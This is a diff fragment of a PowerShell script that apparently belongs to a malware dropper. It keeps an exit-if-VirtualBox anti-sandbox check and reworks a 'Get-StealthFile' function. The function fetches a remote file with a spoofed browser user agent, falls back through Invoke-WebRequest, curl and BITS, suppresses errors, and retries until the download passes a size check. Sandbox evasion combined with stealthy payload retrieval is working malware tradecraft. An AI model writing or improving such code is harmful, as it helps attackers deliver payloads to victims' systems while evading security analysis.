@@ -17,10 +17,19 @@ if (Test-Path "C:\windows\System32\Drivers\VBoxMouse.sys") { exit }
 
 function Get-StealthFile($Url, $Path) {
     $UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-    if (Test-Path $Path) { Remove-Item $Path -Force -ErrorAction SilentlyContinue }
-    try { Invoke-WebRequest -Uri $Url -OutFile $Path -UseBasicParsing -UserAgent $UA -ErrorAction Stop | Out-Null; return $true } catch { }
-    try { curl.exe -L -H "User-Agent: $UA" -o $Path $Url 2>$null; return $true } catch { }
-    try { Import-Module BitsTransfer; Start-BitsTransfer -Source $Url -Destination $Path; return $true } catch { }
+    for ($i = 0; $i -lt 3; $i++) {
+        if (Test-Path $Path) { Remove-Item $Path -Force -ErrorAction SilentlyContinue }
+        try { Invoke-WebRequest -Uri $Url -OutFile $Path -UseBasicParsing -UserAgent $UA -ErrorAction Stop | Out-Null } catch {
+            try { curl.exe -L -H "User-Agent: $UA" -o $Path $Url 2>$null } catch {
+                try { Import-Module BitsTransfer; Start-BitsTransfer -Source $Url -Destination $Path -ErrorAction SilentlyContinue } catch { }
+            }
+        }
+        if (Test-Path $Path) {
+            $Size = (Get-Item $Path).Length
+            if ($Size -gt 100kb) { return $true } # Make sure we didn't just download a 404 page
+        }
+        Start-Sleep -Seconds 2
+    }
     return $false
 }
 
